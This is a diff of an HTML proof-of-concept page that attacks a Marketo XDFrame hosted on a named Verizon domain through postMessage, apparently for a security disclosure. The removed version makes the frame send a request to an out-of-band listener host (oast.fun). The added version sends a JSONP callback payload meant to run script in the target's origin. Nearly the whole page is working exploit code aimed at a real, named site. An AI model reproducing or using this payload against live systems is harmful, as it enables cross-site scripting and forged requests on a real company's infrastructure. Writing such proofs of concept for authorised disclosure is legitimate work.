@@ -1,70 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Marketo XDFrame Vulnerability PoC</title>
+    <title>Marketo XDFrame XSS PoC</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        code { background: #eee; padding: 2px 5px; }
-        #status { font-weight: bold; margin-top: 20px; color: #d00; }
-        .instructions { background: #f9f9f9; border-left: 5px solid #ccc; padding: 15px; margin-top: 20px; }
+        body { font-family: sans-serif; padding: 20px; }
+        #status { font-weight: bold; color: #d00; margin-bottom: 10px; }
+        .log { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; font-family: monospace; white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <h1>Marketo XDFrame postMessage Exploit</h1>
+    <h1>Marketo XDFrame XSS PoC</h1>
     <p>Target: <code>https://info.business.solution.verizon.com/index.php/form/XDFrame</code></p>
-    
-    <div class="instructions">
-        <strong>How to verify:</strong><br>
-        1. Replace the <code>webhookUrl</code> in the script below with your own (e.g., from <a href="https://webhook.site" target="_blank">Webhook.site</a>).<br>
-        2. Open this file in your browser.<br>
-        3. Check your webhook for a request coming from Verizon infrastructure.
-    </div>
-
     <div id="status">Status: Waiting for XDFrame...</div>
-    
-    <!-- The vulnerable XDFrame -->
+    <div class="log" id="log">Logs:</div>
+
+    <!-- The target XDFrame -->
     <iframe id="vulnerable_frame" 
             src="https://info.business.solution.verizon.com/index.php/form/XDFrame" 
-            style="display:none;"></iframe>
+            style="width:0;height:0;border:0;"></iframe>
 
     <script>
-        var targetFrame = document.getElementById('vulnerable_frame');
-        // REPLACE THIS URL with your own listener
-        var webhookUrl = "https://phzgopumovfierxwaukjbxoxv0bozjwaj.oast.fun/REPLACE-ME-WITH-YOUR-ID"; 
+        var frame = document.getElementById('vulnerable_frame');
+        var log = document.getElementById('log');
+
+        function addToLog(msg) {
+            log.innerText += "\n[" + new Date().toLocaleTimeString() + "] " + msg;
+        }
 
         window.addEventListener("message", function(event) {
             if (event.origin !== "https://info.business.solution.verizon.com") return;
 
             try {
                 var data = JSON.parse(event.data);
-                
+                addToLog("Received: " + event.data);
+
                 if (data.mktoReady) {
-                    document.getElementById('status').innerText = "Status: XDFrame Ready. Sending Payload...";
-                    sendPayload();
-                }
-                
-                if (data.mktoResponse) {
-                    console.log("Response received from XDFrame:", data.mktoResponse);
-                    document.getElementById('status').innerText = "Status: Request Sent! Check your webhook.";
+                    document.getElementById('status').innerText = "Status: XDFrame Ready. Triggering XSS Attempt...";
+                    triggerXSS();
                 }
             } catch (e) {}
         });
 
-        function sendPayload() {
+        function triggerXSS() {
             var payload = {
                 "mktoRequest": {
-                    "id": Date.now(),
+                    "id": "xss_exploit",
                     "ajaxParams": {
-                        "url": webhookUrl,
-                        "data": {
-                            "vulnerability": "Marketo_XDFrame_PostMessage_Control",
-                            "poc_origin": window.location.href,
-                            "timestamp": new Date().toISOString()
-                        }
+                        // Standard JSONP promotion bypass payload
+                        "url": "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js?callback=alert('XSS_SUCCESS_'+document.domain)//",
+                        "dataType": "jsonp"
                     }
                 }
             };
-            targetFrame.contentWindow.postMessage(JSON.stringify(payload), "*");
+
+            addToLog("Sending Payload to XDFrame...");
+            frame.contentWindow.postMessage(JSON.stringify(payload), "*");
         }
     </script>
 </body>
